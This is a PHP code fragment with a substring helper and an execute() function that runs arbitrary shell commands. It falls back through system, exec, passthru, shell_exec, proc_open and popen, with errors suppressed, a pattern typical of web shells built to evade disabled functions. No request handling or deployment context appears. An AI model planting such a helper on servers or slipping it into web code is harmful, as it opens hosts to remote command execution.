  function getStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
  }
  function execute($cmd){
    if(is_callable('system')) {
      @ob_start();
      @system($cmd);
      $ntod = @ob_get_contents();
      @ob_end_clean();
      return $ntod;
    }
    elseif(is_callable('exec')){
      @exec($cmd, $rest);
      foreach($rest as $result){
        $ntod .= $result;
      }
      return $ntod;
    }
    elseif(is_callable('passthru')){
      @ob_start();
      @passthru($cmd);
      $ntod = @ob_get_contents();
      @ob_end_clean();
      return $ntod;
    }
    elseif(is_callable('shell_exec')){
      $ntod = shell_exec($cmd);
      return $ntod;
    }
    elseif(is_callable('proc_open')){
      $ntod = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
      );
      $ntodProc = @proc_open($cmd, $ntod, $pipe, getcwd(), array());
      if(is_resource($ntodProc)){
        while($ntodS = fgets($pipe[1])){
          if(!empty($ntodS)){
            $ntoy .= $ntodS;
          }
        }
        while($ntodY = fgets($pipe[2])){
          if(!empty($ntodY)){
            $ntoy .= $ntodY;
          }
        }
      }
      @proc_close($ntodProc);
      if(!empty($ntoy)){
        return $ntoy;
      }
    }
    elseif(is_callable('popen')){
      $ntod = @popen($cmd, 'r');
      if($ntod){
        while(!feof($ntod)){
          $ntoy .= fread($ntod, 2096);
        }
        pclose($ntod);
      }
      if(!empty($ntoy)){
        return $ntoy;
      }
    }
  }
